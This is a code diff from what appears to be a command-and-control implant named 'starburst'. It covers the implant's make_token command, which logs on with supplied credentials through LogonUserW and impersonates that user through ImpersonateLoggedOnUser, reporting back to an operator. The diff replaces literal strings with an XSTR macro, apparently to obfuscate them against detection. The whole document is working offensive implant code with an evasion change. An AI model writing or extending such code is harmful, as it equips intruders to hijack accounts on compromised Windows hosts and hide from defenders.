@@ -24,7 +24,7 @@ auto declfn starburst::cmd_make_token(
 
     if ( !user_str || user_len == 0 || !pass_str || pass_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need username and password" ) ) );
+            XSTR( "need username and password" ) );
         return;
     }
 
@@ -61,14 +61,14 @@ auto declfn starburst::cmd_make_token(
 
     if ( !ok || !h_token ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LogonUserW failed" ) ) );
+            XSTR( "LogonUserW failed" ) );
         return;
     }
 
     if ( !inst.advapi32.ImpersonateLoggedOnUser( h_token ) ) {
         inst.kernel32.CloseHandle( h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "ImpersonateLoggedOnUser failed" ) ) );
+            XSTR( "ImpersonateLoggedOnUser failed" ) );
         return;
     }
 
@@ -79,9 +79,9 @@ auto declfn starburst::cmd_make_token(
     inst.agent.impersonated_token = h_token;
 
     char msg[320] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "now impersonating " ) ) );
+    str_copy( msg, XSTR( "now impersonating " ) );
     str_concat( msg, domain_buf );
-    str_concat( msg, symbol<char*>( const_cast<char*>( "\\" ) ) );
+    str_concat( msg, XSTR( "\\" ) );
     str_concat( msg, user_buf );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
